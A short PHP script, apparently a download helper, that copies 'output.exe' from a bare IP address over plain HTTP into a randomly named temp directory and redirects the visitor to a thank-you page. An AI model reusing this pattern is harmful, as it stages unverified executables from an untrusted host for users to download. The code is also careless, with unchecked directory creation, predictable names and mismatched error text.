<?php
// generate a random number
    $random_number = mt_rand();
   
	
	mkdir("temp"); 
// create the temp directory
// the final slash in the path may cause errors in some circumstances
    $temp_dir = "temp/" . $random_number;


 if(!mkdir($temp_dir))
    {
        echo "Sorry, something went wrong creating $temp_dir";
    }
    
// copy the download file to temp directory 
    if(!copy("http://138.91.138.253/Test/uploads/output.exe",$temp_dir . "/output.exe"))
    {
        echo "Sorry, something was wrong copying your_file.abc to $temp_dir";
    }
    
// redirect to thank you html
// pass the temp directory in the URL
// do not send echo or printf before this line (excluding error messages)
    header("Location: http://138.91.138.253/Test/uploads/thank_you.php?dir=".$random_number);
?>